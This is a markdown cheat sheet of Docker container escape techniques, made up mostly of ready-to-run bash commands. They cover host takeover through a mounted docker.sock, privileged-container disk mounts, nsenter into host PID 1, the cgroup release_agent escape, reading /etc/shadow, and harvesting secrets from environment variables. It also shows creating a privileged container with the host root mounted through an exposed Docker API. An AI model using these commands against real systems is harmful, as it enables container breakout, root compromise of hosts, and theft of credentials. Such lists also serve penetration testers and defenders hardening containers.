# Docker Escape Techniques

## 1. Docker Socket Mounted
```bash
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -i -n bash
```

## 2. Privileged Container
```bash
# If container is privileged
mount /dev/sda1 /mnt
chroot /mnt
# Or
mkdir /mnt && mount /dev/sda1 /mnt && chroot /mnt bash
```

## 3. Host PID Namespace
```bash
# If hostPID is enabled
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
nsenter -t 1 -m -u -i -n bash
```

## 4. Capabilities Abuse
```bash
# Check capabilities
cat /proc/1/status | grep -i cap
# If CAP_SYS_ADMIN
mount /dev/sda1 /mnt
# If CAP_DAC_READ_SEARCH
find / -name "*.conf" -readable
# If CAP_NET_RAW
tcpdump -i eth0
```

## 5. cgroup Escape
```bash
# If cgroup v1 and privileged
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/x
echo 1 > $d/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > $d/x/cgroup.procs"
cat /output
```

## 6. Volume Mount Abuse
```bash
# If / is mounted
ls /host/etc/shadow
cat /host/etc/shadow
# If docker socket mounted
docker run -it -v /:/host alpine chroot /host
```

## 7. Network Namespace
```bash
# If container shares host network
# Access host services
curl http://127.0.0.1:2375/containers/json
```

## 8. Docker API
```bash
# If Docker API exposed
curl http://target:2375/containers/json
curl http://target:2375/images/json
# Create privileged container
curl -X POST http://target:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"Privileged":true}'
```

## 9. Environment Variable Leak
```bash
env
cat /proc/self/environ
# May contain secrets, API keys, passwords
```

## 10. Container Breakout via runc (CVE-2019-5736)
```bash
# runc < 1.0-rc6
# Exploit available on GitHub
```

## 11. Kernel Exploit
```bash
# If kernel is shared
uname -a
# Use kernel exploit for escape
# DirtyPipe, DirtyCow, etc.
```

## Detection
```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
# Check mounts
mount | grep docker
# Check capabilities
cat /proc/1/status | grep Cap
```
